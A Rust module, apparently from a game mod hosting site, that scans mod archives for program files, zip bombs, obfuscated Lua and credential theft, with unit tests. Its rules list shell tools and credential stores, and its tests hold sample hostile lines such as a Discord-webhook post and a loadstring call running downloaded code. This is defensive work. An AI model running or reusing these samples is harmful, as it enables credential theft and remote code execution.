//! The safety scan of a mod archive, run on every archive the site lists and on every
//! registration. The archive is only read, never unpacked to disk and never run.
//!
//! A finding either rejects the mod (nothing honest looks like it) or holds it for the site's
//! owner. Each has a kind; a registry entry's `allow` list waives kinds for one repository.
//! QuarterMaster's own capability ratings (`qm_schema::security`) are reused: its High ratings
//! hold a mod, the others are only shown on the mod's page.
//!
//! A scan of the text cannot prove a mod is safe. It catches what is careless or common; the
//! denylist stays the answer to an author who hides something well.
use qm_schema::{SecurityCapability, SecurityScanReport};
use regex_lite::Regex;
use std::io::Read;

/// More files than this in one archive is not a mod.
const MAX_FILES: usize = 10_000;
/// The most an archive may unpack to.
const MAX_UNPACKED: u64 = 1024 * 1024 * 1024;
/// A file this large that packed more than `BOMB_RATIO` to one is a zip bomb.
const BOMB_SIZE: u64 = 50 * 1024 * 1024;
const BOMB_RATIO: u64 = 100;
/// Source files larger than this are not read (and are held: they cannot be checked).
const MAX_SOURCE: u64 = 4 * 1024 * 1024;
/// A line of code longer than this is packed or generated, not written.
const LONG_LINE: usize = 4000;
/// How much of a file is read to tell what kind of file it is.
const SNIFF: usize = 4096;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Action {
    /// Not listed, and a registration is refused.
    Reject,
    /// Not listed until the site's owner allows this kind for the repository.
    Hold,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    /// The name `allow` uses, such as `native_ffi`.
    pub kind: &'static str,
    pub action: Action,
    /// The file in the archive; empty for the archive itself.
    pub file: String,
    /// The line, from 1; 0 for the whole file.
    pub line: usize,
    /// What was found, in words an author can act on.
    pub detail: String,
}

impl Finding {
    /// `file:line: detail`, or shorter when there is no file or line.
    pub fn text(&self) -> String {
        match (self.file.is_empty(), self.line) {
            (true, _) => self.detail.clone(),
            (false, 0) => format!("`{}`: {}", self.file, self.detail),
            (false, n) => format!("`{}` line {n}: {}", self.file, self.detail),
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct ArchiveScan {
    pub findings: Vec<Finding>,
    /// What the mod's code is able to do, by QuarterMaster's ratings.
    pub capabilities: Vec<SecurityCapability>,
}

impl ArchiveScan {
    /// The findings that keep the mod from being listed: all but the kinds in `allow`.
    pub fn blocking(&self, allow: &[String]) -> Vec<&Finding> {
        self.findings
            .iter()
            .filter(|f| !allow.iter().any(|a| a.eq_ignore_ascii_case(f.kind)))
            .collect()
    }
}

/// Text that comes from a mod (a file's name, the mod's name or version), made safe to put in
/// a comment or an issue: no markup, no mentions, one line, not long.
pub fn clean(s: &str) -> String {
    s.chars()
        .filter(|c| !c.is_control() && !"`@<>[]|*#".contains(*c))
        .take(100)
        .collect()
}

/// The wiki's name for a capability (Part 9, "The security scan").
pub fn capability_name(c: SecurityCapability) -> &'static str {
    match c {
        SecurityCapability::ProcessExecution => "Running programs",
        SecurityCapability::NativeFfi => "Native code",
        SecurityCapability::NetworkAccess => "Network access",
        SecurityCapability::RawFilesystemIo => "Reading or writing any file",
        SecurityCapability::DynamicCodeExecution => "Loading code at run time",
    }
}

/// Program files: nothing in a Lua mod needs one, and their contents cannot be checked.
const PROGRAM_TYPES: &[&str] = &[
    "exe", "dll", "so", "dylib", "scr", "com", "pif", "msi", "msp", "cpl", "sys", "drv", "ocx",
    "lnk", "jar",
];
/// Scripts the game never runs, but a person could be told to.
const SCRIPT_TYPES: &[&str] = &[
    "bat", "cmd", "ps1", "psm1", "vbs", "vbe", "js", "jse", "wsf", "wsh", "hta", "reg", "sh", "py",
    "pyc",
];

/// A program by its first bytes, whatever the file is called.
fn program_kind(head: &[u8]) -> Option<&'static str> {
    let at = |i: usize| head.get(i).copied().unwrap_or(0);
    if head.starts_with(b"MZ") && head.len() >= 0x40 {
        // The header says where the "PE" mark is; a text file that starts with "MZ" has none.
        let pe = u32::from_le_bytes([at(0x3C), at(0x3D), at(0x3E), at(0x3F)]) as usize;
        let mark = pe
            .checked_add(4)
            .and_then(|end| head.get(pe..end))
            .is_some_and(|m| m == b"PE\0\0");
        if mark {
            return Some("a Windows program");
        }
    }
    if head.starts_with(b"\x7fELF") {
        return Some("a Linux program");
    }
    const MACH: [[u8; 4]; 5] = [
        [0xFE, 0xED, 0xFA, 0xCE],
        [0xFE, 0xED, 0xFA, 0xCF],
        [0xCE, 0xFA, 0xED, 0xFE],
        [0xCF, 0xFA, 0xED, 0xFE],
        [0xCA, 0xFE, 0xBA, 0xBE],
    ];
    if MACH.iter().any(|m| head.starts_with(m)) {
        return Some("a macOS program or Java class");
    }
    None
}

fn is_bytecode(head: &[u8]) -> bool {
    head.starts_with(b"\x1bLua") || head.starts_with(b"\x1bLJ")
}

fn is_archive(head: &[u8]) -> bool {
    head.starts_with(b"PK\x03\x04")
        || head.starts_with(b"7z\xBC\xAF\x27\x1C")
        || head.starts_with(b"Rar!")
        || head.starts_with(&[0x1F, 0x8B])
}

fn extension(name: &str) -> String {
    name.rsplit('/')
        .next()
        .and_then(|f| f.rsplit_once('.'))
        .map(|(_, e)| e.to_ascii_lowercase())
        .unwrap_or_default()
}

/// One line-level rule.
struct Rule {
    kind: &'static str,
    action: Action,
    pattern: &'static str,
    detail: &'static str,
}

const RULES: &[Rule] = &[
    Rule {
        kind: "shell_tools",
        action: Action::Reject,
        pattern: r"(?i)\b(powershell|pwsh|cmd\.exe|cmd\s+/c|certutil|bitsadmin|mshta|rundll32|regsvr32|schtasks|wscript|cscript|reg\s+add)\b",
        detail: "names a Windows command-line tool.",
    },
    Rule {
        kind: "credential_paths",
        action: Action::Reject,
        pattern: r"(?i)(login data|\.ssh[\\/]|id_rsa|wallet\.dat|cookies\.sqlite|local storage[\\/]+leveldb|discord(app)?\.com/api/webhooks|api\.telegram\.org/bot)",
        detail: "names a place where passwords, keys or browser data are kept, or a message hook used to send them away.",
    },
    Rule {
        kind: "obfuscated",
        action: Action::Reject,
        pattern: r"string\.char\s*\((\s*\d+\s*,){7,}",
        detail: "builds text from a long list of character codes.",
    },
    Rule {
        kind: "obfuscated",
        action: Action::Reject,
        pattern: r"(\\\d{1,3}){16,}|(\\x[0-9a-fA-F]{2}){16,}",
        detail: "has a long run of escaped characters in place of readable text.",
    },
    Rule {
        kind: "obfuscated",
        action: Action::Reject,
        pattern: r"(?i)\b(loadstring|load)\s*\(\s*[^)]*(string\.char|decode|b64|base64|fromhex|reverse\s*\(|\\x[0-9a-f]{2}|\\\d{2,3})",
        detail: "runs code that is decoded or assembled first.",
    },
    Rule {
        kind: "download_and_run",
        action: Action::Reject,
        pattern: r"(?i)\b(loadstring|load|loadfile|dofile)\s*\(\s*[^)]*(https?:|\.request\s*\(|:receive\s*\(|download|fetch)",
        detail: "runs code that it downloads.",
    },
    Rule {
        kind: "process_execution",
        action: Action::Hold,
        pattern: r"\b(os\.(execute|remove|rename)|io\.popen)\b",
        detail: "can run programs or delete and move files (QuarterMaster rates this High).",
    },
    Rule {
        kind: "native_ffi",
        action: Action::Hold,
        // `pcall(require, "ffi")` is the usual way to ask for it without failing.
        pattern: r#"\bpackage\.(loadlib|cpath)\b|require\s*[(,]?\s*["']ffi["']|\bffi\.(load|cdef|C)\b"#,
        detail: "loads native code (QuarterMaster rates this High).",
    },
    Rule {
        kind: "hidden_access",
        action: Action::Hold,
        pattern: r#"\b(getfenv|setfenv)\s*\(|\bdebug\.(getregistry|getupvalue|setupvalue|sethook)\b|\b(os|io|package\.loaded)\s*\[|\b_G\s*\[\s*["'](os|io|package|debug|ffi|loadstring|load|require)["']\s*\]"#,
        detail: "reaches system functions in a way the capability scan cannot follow.",
    },
    Rule {
        kind: "environment",
        action: Action::Hold,
        pattern: r#"(?i)os\.getenv\s*\(\s*["'](APPDATA|LOCALAPPDATA|USERPROFILE|HOMEPATH|HOMEDRIVE|HOME|TEMP|TMP|USERNAME|COMPUTERNAME|PROGRAMDATA)["']"#,
        detail: "reads where the user's own files are.",
    },
    Rule {
        kind: "packed_source",
        action: Action::Hold,
        pattern: r"[A-Za-z0-9+/]{400,}={0,2}",
        detail: "has a long block of encoded data in the code.",
    },
];

/// Network use and run-time loading in one file: code could arrive over the network.
const NETWORK: &str = r#"(?i)require\s*[(,]?\s*["'](socket|socket\.http|ssl\.https|enet)["']|\bhttps?\.request\b|\bsocket\.(tcp|udp|connect)\b"#;
const DYNAMIC: &str = r"\b(loadstring|loadfile|dofile|load)\s*\(";

struct Compiled {
    rules: Vec<(&'static Rule, Regex)>,
    network: Regex,
    dynamic: Regex,
}

impl Compiled {
    fn new() -> Self {
        // The patterns are constants; `scan_rules_compile` checks every one of them.
        let re = |p: &str| Regex::new(p).unwrap_or_else(|e| panic!("scan pattern {p}: {e}"));
        Self {
            rules: RULES.iter().map(|r| (r, re(r.pattern))).collect(),
            network: re(NETWORK),
            dynamic: re(DYNAMIC),
        }
    }
}

/// A comment-only line, as QuarterMaster's own scan reads one.
fn is_comment(trimmed: &str) -> bool {
    trimmed.starts_with("--") || trimmed.starts_with('#')
}

fn scan_text(name: &str, text: &str, rules: &Compiled, out: &mut ArchiveScan) {
    // QuarterMaster's ratings: the High ones hold the mod, all are shown on its page.
    for f in SecurityScanReport::scan_source(name, text) {
        if !out.capabilities.contains(&f.capability) {
            out.capabilities.push(f.capability);
        }
    }
    let (mut network, mut dynamic) = (0usize, 0usize);
    for (i, raw) in text.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || is_comment(line) {
            continue;
        }
        if network == 0 && rules.network.is_match(line) {
            network = i + 1;
        }
        if dynamic == 0 && rules.dynamic.is_match(line) {
            dynamic = i + 1;
        }
        if line.len() > LONG_LINE {
            out.findings.push(Finding {
                kind: "packed_source",
                action: Action::Hold,
                file: name.to_string(),
                line: i + 1,
                detail: format!(
                    "is {} characters long: packed or generated code cannot be read.",
                    line.len()
                ),
            });
            continue; // One finding for a packed line is enough.
        }
        let mut seen: Vec<&str> = Vec::new();
        for (rule, re) in &rules.rules {
            if !seen.contains(&rule.kind) && re.is_match(line) {
                seen.push(rule.kind);
                out.findings.push(Finding {
                    kind: rule.kind,
                    action: rule.action,
                    file: name.to_string(),
                    line: i + 1,
                    detail: rule.detail.to_string(),
                });
            }
        }
    }
    if network != 0 && dynamic != 0 {
        out.findings.push(Finding {
            kind: "network_and_dynamic_code",
            action: Action::Hold,
            file: name.to_string(),
            line: dynamic,
            detail: format!(
                "uses the network (line {network}) and also runs code built at run time, so code could arrive over the network."
            ),
        });
    }
}

fn archive_finding(detail: String) -> Finding {
    Finding {
        kind: "archive",
        action: Action::Reject,
        file: String::new(),
        line: 0,
        detail,
    }
}

fn file_finding(kind: &'static str, action: Action, file: &str, detail: String) -> Finding {
    Finding {
        kind,
        action,
        file: file.to_string(),
        line: 0,
        detail,
    }
}

/// Scans a `.zip` or `.qmpack`.
pub fn scan_archive(bytes: &[u8]) -> ArchiveScan {
    let mut out = ArchiveScan::default();
    let mut zip = match zip::ZipArchive::new(std::io::Cursor::new(bytes)) {
        Ok(z) => z,
        Err(e) => {
            out.findings.push(archive_finding(format!(
                "The archive cannot be read ({e})."
            )));
            return out;
        }
    };
    if zip.len() > MAX_FILES {
        out.findings.push(archive_finding(format!(
            "The archive holds {} files; a mod has at most {MAX_FILES}.",
            zip.len()
        )));
        return out;
    }
    let rules = Compiled::new();
    let mut unpacked: u64 = 0;
    for i in 0..zip.len() {
        let mut f = match zip.by_index(i) {
            Ok(f) => f,
            Err(e) => {
                out.findings.push(archive_finding(format!(
                    "Entry {i} of the archive cannot be read ({e})."
                )));
                continue;
            }
        };
        let raw_name = f.name().replace('\\', "/");
        let name = clean(&raw_name);
        if f.enclosed_name().is_none() {
            out.findings.push(archive_finding(format!(
                "`{name}` is a path that leaves the mod's folder."
            )));
            continue;
        }
        if f.is_symlink() {
            out.findings.push(archive_finding(format!(
                "`{name}` is a link to another file, not a file."
            )));
            continue;
        }
        if f.is_dir() {
            continue;
        }
        unpacked = unpacked.saturating_add(f.size());
        if unpacked > MAX_UNPACKED
            || (f.size() > BOMB_SIZE && f.size() / f.compressed_size().max(1) > BOMB_RATIO)
        {
            out.findings.push(archive_finding(format!(
                "`{name}` unpacks to far more than its packed size (a zip bomb), or the archive is over {} MB unpacked.",
                MAX_UNPACKED / 1024 / 1024
            )));
            return out;
        }

        let ext = extension(&raw_name);
        let is_source = ext == "lua" || ext == "toml";
        let limit = if is_source {
            MAX_SOURCE + 1
        } else {
            SNIFF as u64
        };
        let mut data = Vec::new();
        if f.by_ref().take(limit).read_to_end(&mut data).is_err() {
            out.findings.push(archive_finding(format!(
                "`{name}` is damaged in the archive."
            )));
            continue;
        }
        let head = &data[..data.len().min(SNIFF)];

        if is_bytecode(head) {
            out.findings.push(file_finding(
                "bytecode",
                Action::Reject,
                &name,
                "is compiled Lua, which cannot be read. Ship the source.".into(),
            ));
            continue;
        }
        if let Some(what) = program_kind(head) {
            out.findings.push(file_finding(
                "program_file",
                Action::Reject,
                &name,
                format!("is {what}."),
            ));
            continue;
        }
        if PROGRAM_TYPES.contains(&ext.as_str()) {
            out.findings.push(file_finding(
                "program_file",
                Action::Reject,
                &name,
                format!("is a program file (.{ext})."),
            ));
            continue;
        }
        if SCRIPT_TYPES.contains(&ext.as_str()) {
            out.findings.push(file_finding(
                "script_file",
                Action::Hold,
                &name,
                format!("is a script the game does not use (.{ext})."),
            ));
            continue;
        }
        if is_archive(head) {
            out.findings.push(file_finding(
                "nested_archive",
                Action::Hold,
                &name,
                "is an archive inside the archive, which is not looked into.".into(),
            ));
            continue;
        }
        if !is_source {
            continue;
        }
        if data.len() as u64 > MAX_SOURCE {
            out.findings.push(file_finding(
                "unreadable_source",
                Action::Hold,
                &name,
                format!(
                    "is over {} MB, too large to check.",
                    MAX_SOURCE / 1024 / 1024
                ),
            ));
            continue;
        }
        match std::str::from_utf8(&data) {
            Ok(text) => scan_text(&name, text.trim_start_matches('\u{feff}'), &rules, &mut out),
            Err(_) => out.findings.push(file_finding(
                "unreadable_source",
                Action::Hold,
                &name,
                "is not readable text (UTF-8).".into(),
            )),
        }
    }
    for (kind, capability) in [
        ("process_execution", SecurityCapability::ProcessExecution),
        ("native_ffi", SecurityCapability::NativeFfi),
    ] {
        if out.findings.iter().any(|f| f.kind == kind) && !out.capabilities.contains(&capability) {
            out.capabilities.push(capability);
        }
    }
    out.capabilities.sort();
    // A line the capability scan and a rule both found is one finding.
    out.findings
        .dedup_by(|a, b| a.kind == b.kind && a.file == b.file && a.line == b.line);
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn zip_of(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut buf = std::io::Cursor::new(Vec::new());
        {
            let mut zip = zip::ZipWriter::new(&mut buf);
            let opts = zip::write::SimpleFileOptions::default();
            for (name, data) in files {
                zip.start_file(*name, opts).unwrap();
                zip.write_all(data).unwrap();
            }
            zip.finish().unwrap();
        }
        buf.into_inner()
    }

    fn kinds(scan: &ArchiveScan) -> Vec<(&'static str, Action)> {
        scan.findings.iter().map(|f| (f.kind, f.action)).collect()
    }

    fn scan_lua(code: &str) -> ArchiveScan {
        scan_archive(&zip_of(&[("mod/main.lua", code.as_bytes())]))
    }

    #[test]
    fn scan_rules_compile() {
        let c = Compiled::new();
        assert_eq!(c.rules.len(), RULES.len());
    }

    #[test]
    fn plain_mod_has_no_findings() {
        let scan = scan_archive(&zip_of(&[
            ("mod/mod.json", br#"{"id":"m","name":"M","version":"1.0.0"}"#),
            ("mod/qm.toml", b"[manifest]\nversion = \"1.0.0\"\n\n[[patches]]\n[patches.pattern]\ntarget = \"main.lua\"\npattern = 'x = 1'\npayload = 'print(\"hello\")'\n"),
            ("mod/main.lua", b"-- os.execute('in a comment')\nlocal t = love.filesystem.read('a.txt')\n_G['MyMod'] = { debug.traceback() }\nlocal s = string.char(65, 66)\n"),
            ("mod/art/card.png", b"\x89PNG\r\n\x1a\n...."),
        ]));
        assert!(scan.findings.is_empty(), "{:?}", scan.findings);
        assert!(scan.capabilities.is_empty());
    }

    #[test]
    fn capabilities_are_listed_and_only_high_ones_hold() {
        let scan = scan_lua("local s = require('socket')\nlocal f = io.open('x', 'r')\n");
        assert!(scan.findings.is_empty(), "{:?}", scan.findings);
        assert_eq!(
            scan.capabilities,
            [
                SecurityCapability::NetworkAccess,
                SecurityCapability::RawFilesystemIo
            ]
        );
        assert_eq!(capability_name(scan.capabilities[0]), "Network access");

        let scan = scan_lua("local ffi = require('ffi')\nos.execute('x')\nlocal e = os.rename\n");
        assert_eq!(
            kinds(&scan),
            [
                ("native_ffi", Action::Hold),
                ("process_execution", Action::Hold),
                // Kept in a variable, with no call for the capability scan to see.
                ("process_execution", Action::Hold),
            ]
        );
        // The site's owner can allow a kind for one repository.
        assert_eq!(scan.blocking(&[]).len(), 3);
        assert_eq!(scan.blocking(&["native_ffi".into()]).len(), 2);
        assert!(scan
            .blocking(&["Native_FFI".into(), "process_execution".into()])
            .is_empty());
    }

    #[test]
    fn programs_bytecode_and_scripts() {
        let mut pe = vec![0u8; 0x100];
        pe[..2].copy_from_slice(b"MZ");
        pe[0x3C] = 0x80;
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        let scan = scan_archive(&zip_of(&[
            ("mod/helper.png", &pe),
            ("mod/lib.so", b"\x7fELF\x02\x01"),
            ("mod/tool.dll", b"not really"),
            ("mod/a.lua", b"\x1bLJ\x02\x00"),
            ("mod/b.luac", b"\x1bLuaQ\x00"),
            ("mod/setup.bat", b"@echo off"),
            ("mod/extra.zip", b"PK\x03\x04...."),
            ("mod/readme.txt", b"MZ is how this sentence starts, and it goes on for long enough to be read as a header."),
        ]));
        assert_eq!(
            kinds(&scan),
            [
                ("program_file", Action::Reject),
                ("program_file", Action::Reject),
                ("program_file", Action::Reject),
                ("bytecode", Action::Reject),
                ("bytecode", Action::Reject),
                ("script_file", Action::Hold),
                ("nested_archive", Action::Hold),
            ]
        );
        assert_eq!(
            scan.findings[0].text(),
            "`mod/helper.png`: is a Windows program."
        );
    }

    #[test]
    fn hostile_code_is_rejected() {
        for (code, kind) in [
            ("os.execute('powershell -enc AAAA')", "shell_tools"),
            ("local p = [[C:\\Users\\x\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data]]", "credential_paths"),
            ("post('https://discord.com/api/webhooks/1/abc', data)", "credential_paths"),
            ("local f = string.char(111, 115, 46, 101, 120, 101, 99, 117, 116, 101)", "obfuscated"),
            ("local s = '\\111\\115\\46\\101\\120\\101\\99\\117\\116\\101\\40\\39\\100\\105\\114\\39\\41'", "obfuscated"),
            ("loadstring(b64.decode(payload))()", "obfuscated"),
            ("loadstring(http.request('https://example.com/x.lua'))()", "download_and_run"),
        ] {
            let scan = scan_lua(code);
            assert!(
                scan.findings.iter().any(|f| f.kind == kind && f.action == Action::Reject),
                "{code} should be rejected as {kind}: {:?}",
                scan.findings
            );
        }
        // The same in a patch's payload is found too.
        let toml = b"[[patches]]\n[patches.pattern]\npayload = 'loadstring(http.request(\"https://example.com/x.lua\"))()'\n";
        let scan = scan_archive(&zip_of(&[("mod/qm.toml", toml)]));
        assert!(
            scan.findings.iter().any(|f| f.kind == "download_and_run"),
            "{:?}",
            scan.findings
        );
    }

    #[test]
    fn suspicious_code_is_held() {
        // A serializer keeping `string.dump` in a local is ordinary, and is not held.
        assert!(scan_lua("local concat, dump = table.concat, string.dump")
            .findings
            .is_empty());
        for (code, kind) in [
            ("local ok, ffi = pcall(require, \"ffi\")", "native_ffi"),
            ("local e = getfenv(0)", "hidden_access"),
            ("local x = os['exe' .. 'cute']", "hidden_access"),
            ("local x = _G['os']", "hidden_access"),
            ("local home = os.getenv('USERPROFILE')", "environment"),
            (
                "local http = require('socket.http')\nlocal f = loadstring(body)",
                "network_and_dynamic_code",
            ),
        ] {
            let scan = scan_lua(code);
            assert!(
                scan.findings
                    .iter()
                    .any(|f| f.kind == kind && f.action == Action::Hold),
                "{code} should be held as {kind}: {:?}",
                scan.findings
            );
            assert!(
                scan.findings.iter().all(|f| f.action == Action::Hold),
                "{code}: {:?}",
                scan.findings
            );
        }
        let long = format!("local t = {{ {} }}", "1, ".repeat(2000));
        let scan = scan_lua(&long);
        assert_eq!(kinds(&scan), [("packed_source", Action::Hold)]);
        assert_eq!(scan.findings[0].line, 1);
        let blob = format!("local d = '{}'", "QUJD".repeat(120));
        assert_eq!(kinds(&scan_lua(&blob)), [("packed_source", Action::Hold)]);
        assert_eq!(
            kinds(&scan_archive(&zip_of(&[(
                "mod/a.lua",
                &[0xFF, 0xFE, 0x00, 0x41]
            )]))),
            [("unreadable_source", Action::Hold)]
        );
    }

    #[test]
    fn archive_tricks_are_rejected() {
        let scan = scan_archive(b"this is not a zip");
        assert_eq!(kinds(&scan), [("archive", Action::Reject)]);
        let scan = scan_archive(&zip_of(&[
            ("../outside.lua", b"x = 1"),
            ("mod/ok.lua", b"x = 1"),
        ]));
        assert_eq!(kinds(&scan), [("archive", Action::Reject)]);
        assert!(scan.findings[0].detail.contains("leaves the mod's folder"));
    }
}
